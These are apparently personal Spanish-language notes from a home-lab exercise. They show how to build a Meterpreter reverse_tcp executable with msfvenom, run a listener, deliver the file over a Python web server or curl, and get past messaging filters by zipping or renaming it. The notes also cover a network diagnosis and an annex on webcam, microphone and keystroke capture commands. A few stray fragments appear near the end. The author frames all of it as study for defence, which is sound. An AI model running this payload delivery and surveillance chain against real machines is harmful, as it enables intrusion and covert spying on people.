1. CONCEPTO APRENDIDO ANTES DE TOCAR NADA
-------------------------------------------------------------------------------
MITO: "mando un .txt/.exe y se ejecuta solo en la otra maquina".
REALIDAD: una maquina solo ejecuta codigo externo si:
  (a) hay un SERVICIO escuchando que te deja entrar + credenciales (ej. SSH/RDP), o
  (b) hay una VULNERABILIDAD que explotas, o el usuario ejecuta el payload el mismo.
Requisito previo en ambos casos: tiene que haber un puerto/servicio con el que hablar.
Orden siempre: ENUMERAR primero, ENTRAR despues.

Se eligio "Camino A": generar un payload (msfvenom) + listener (multi/handler) +
sesion Meterpreter + navegar. El usuario "victima" ejecuta el payload (se simula
el phishing/descarga en el propio lab).

msfvenom = fabrica el payload (la "bala").
metasploit multi/handler = recibe la conexion (el "arma").
reverse_tcp = la VICTIMA llama de vuelta al atacante (atraviesa firewalls, porque
              las conexiones salientes casi nunca se bloquean). Por eso NO bind_tcp.
LHOST = IP del ATACANTE (a donde vuelve la llamada). Error #1 de novato: poner la
        IP de la victima aqui.

4. GENERACION DEL PAYLOAD (en BlackArch)
-------------------------------------------------------------------------------
Comando:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 -f exe -o trampa.exe

Desglose:
  -p windows/x64/meterpreter/reverse_tcp  -> payload: Windows 64-bit, Meterpreter, reverse
  LHOST=192.168.1.20                      -> IP del atacante (BlackArch, cable)
  LPORT=4444                              -> puerto de escucha
  -f exe                                  -> formato ejecutable Windows
  -o trampa.exe                           -> archivo de salida (nombre cebo)

Salida real:
  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  [-] No arch selected, selecting arch: x64 from the payload
  No encoder specified, outputting raw payload
  Payload size: 509 bytes
  Final size of exe file: 7680 bytes
  Saved as: trampa.exe

Aprendizaje: "No encoder specified, outputting raw payload" -> el payload va a pelo,
sin ofuscar -> cualquier antivirus lo detecta al instante. Bien para el lab (Defender
off), pero en real ese "raw" es lo primero que delata un payload.

-------------------------------------------------------------------------------
5. LISTENER EN METASPLOIT (en BlackArch)
-------------------------------------------------------------------------------
Pasos:
  msfconsole
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST 192.168.1.20
  set LPORT 4444
  show options        (verificar antes de lanzar)
  run                 (o exploit)

Salida objetivo:
  [*] Started reverse TCP handler on 192.168.1.20:4444

ERRORES COMETIDOS Y COMO SE RESOLVIERON:
  (e1) "use = exploit/multi/handler" -> el "=" sobra.
       [-] Failed to load module: =
       FIX: use exploit/multi/handler   (sin "=", modulo pegado con espacio)
  (e2) "set PLAYLOAD ..." (typo: PLAYLOAD con L de mas).
       [!] Unknown datastore option: PLAYLOAD. Did you mean PAYLOAD?
       Efecto: el payload quedo en el DEFAULT generic/shell_reverse_tcp (NO coincidia
       con trampa.exe). Se detecto leyendo la cabecera de "show options":
         "Payload options (generic/shell_reverse_tcp):"  <- mal
       FIX: Ctrl+C, set PAYLOAD windows/x64/meterpreter/reverse_tcp, show options ->
         "Payload options (windows/x64/meterpreter/reverse_tcp):"  <- bien
       LECCION: el handler y el payload del .exe deben ser IDENTICOS o la sesion no entra.

6. ENTREGA DEL PAYLOAD A LA VICTIMA
-------------------------------------------------------------------------------
Metodo: mini servidor web en el atacante.
  cd ~ && python3 -m http.server 8000
Verificado desde el host: sirve trampa.exe -> HTTP 200, 7680 bytes.
El server escucha en 0.0.0.0:8000 (todas las interfaces). Sin firewall en el host
(firewalld inactive, ufw inactive).

Intento desde Edge en la Windows:
  http://192.168.1.20:8000/trampa.exe
  -> ERROR: "Vaya... no se puede obtener acceso a esta pagina"
            "192.168.1.20 tardo demasiado en responder" (TIMEOUT)

Metodos alternativos de transferencia vistos (leccion de EVASION DE FILTROS):
  - WhatsApp bloquea .exe -> disfrazarlo: comprimir en .zip  (zip trampa.zip trampa.exe)
    o renombrar a .txt, enviar, y recuperar/renombrar en la victima.
  - curl integrado de Windows:  curl http://192.168.1.20:8000/trampa.exe -o trampa.exe
    (no usa el proxy de Edge; sirve para aislar si el fallo era el navegador).
  - Carpeta compartida de VirtualBox (Devices -> Shared Folders): no usa red.

7. EJECUCION Y SINTOMA PRINCIPAL
-------------------------------------------------------------------------------
El usuario ejecuto trampa.exe en la Windows: "no paso nada" (no entro sesion).
En el Administrador de tareas aparecieron 5 procesos "trampa" corriendo:
  - CPU 0% , ~0.4 MB cada uno , RED: 0 Mbps en todos.

INTERPRETACION:
  - El payload SE EJECUTA -> Windows Defender NO lo esta bloqueando (se descarta AV).
  - RED a 0 Mbps -> la trampa NO consigue llamar de vuelta a 192.168.1.20:4444.
    Los procesos quedan colgados intentando conectar (SYN sin respuesta).

-------------------------------------------------------------------------------
8. DIAGNOSTICO DE RED (la causa raiz)
-------------------------------------------------------------------------------
Hechos recogidos en el host:
  - Server 8000 OK y accesible por 192.168.1.20 desde el propio host.
  - Sin firewall en el host (firewalld/ufw inactive).
  - ARP: 192.168.1.22 REACHABLE via enp8s0 (host SI ve a la VM).
  - Rutas:
      192.168.1.0/24 dev enp8s0 src 192.168.1.20 metric 100  (gana)
      192.168.1.0/24 dev wlp9s0 src 192.168.1.19 metric 600
  - rp_filter = 2 (modo laxo) en enp8s0/wlp9s0.
  - Ping VM -> host (192.168.1.20): FUNCIONA (ICMP ok).
  - Test-NetConnection 192.168.1.20 -Port 4444 (en PowerShell de la victima):
      se queda en "Waiting for response..." -> TcpTestSucceeded = False.

CONCLUSION:
  El ICMP (ping) pasa pero el TCP VM->host NO completa (ni al 8000 ni al 4444).
  Sintoma tipico del modo BRIDGED cuando el HOST tiene DOS IPs en la misma subred
  (192.168.1.20 cable + 192.168.1.19 wifi): el trafico TCP de retorno host<->VM se
  enreda. Mientras se use puente contra el propio host, el problema se repite.

9. RESULTADO
-------------------------------------------------------------------------------
PARCIAL. Se logro toda la cadena ofensiva (enumeracion, payload, listener, entrega,
ejecucion del payload en la victima). FALTA la sesion Meterpreter, bloqueada por un
problema de RED del laboratorio (no de tecnica): el retorno TCP VM->host no llega en
modo bridged con host de doble IP.

Lo que SI quedo demostrado/aprendido:
  - Mito "mandar y que se ejecute solo" vs realidad (servicio/vuln/ejecucion).
  - msfvenom (fabrica) vs handler (receptor); reverse vs bind; LHOST = atacante.
  - Payload y handler deben coincidir exactamente.
  - Payload "raw" = detectable; zip/renombrar = evasion de filtros basica.
  - Leer la salida para depurar (typos PLAYLOAD, cabecera de show options).
  - Diagnostico de red por capas (ICMP vs TCP, ARP, rutas, rp_filter, proxy).

      OJO: usar 'insert' (va al inicio, antes del reject), NO 'add' (va al final).

      payload raw al instante (confirmado: lo detecto en vivo). FIX: desactivar

-------------------------------------------------------------------------------
 ANEXO - POST-EXPLOTACION: CAMARA Y MICROFONO (demo sobre mi propio equipo)
-------------------------------------------------------------------------------
Exploracion de lo que permite una sesion Meterpreter mas alla de archivos. Hecho
sobre mi propia webcam / mi propia cara / mi propio lab, con fin educativo.

Comandos (grupo Stdapi Webcam/Audio):
  webcam_list       -> enumera las camaras de la victima (indice 1,2,...)
  webcam_snap -i 1  -> toma UNA foto con la webcam y la trae al atacante (.jpeg)
  webcam_stream -i1 -> "video en vivo" (fotos rapidas encadenadas en el navegador)
  record_mic        -> graba audio del microfono X segundos (.wav)
  webcam_chat       -> intento de videochat

Detalle del lab:
  - La VM Windows NO tenia camara (webcam_list salia vacio) -> es hardware virtual.
  - Para la demo se le "presto" la webcam del host por passthrough USB:
        VirtualBox: menu Devices -> Webcams -> [camara del host]
    Tras conectarla, Windows la ve como camara USB y webcam_list ya la lista.
  - webcam_snap -i 1 disparo la camara y trajo la imagen al BlackArch.

LECCION (la mas importante del dia):
  Una maquina comprometida = control TOTAL: camara, microfono, pantalla
  (screenshot), teclas (keyscan_start), archivos... todo, sin que el usuario se de
  cuenta (la webcam a veces ni enciende el LED). Por eso:
    - antivirus SIEMPRE activo (Defender borro el payload raw al instante),
    - NUNCA ejecutar .exe de origen no confiable,
    - tapar la webcam no es paranoia,
    - y usar esto contra terceros sin permiso es delito grave de privacidad.
  Se aprende el ataque para saber DEFENDERSE.
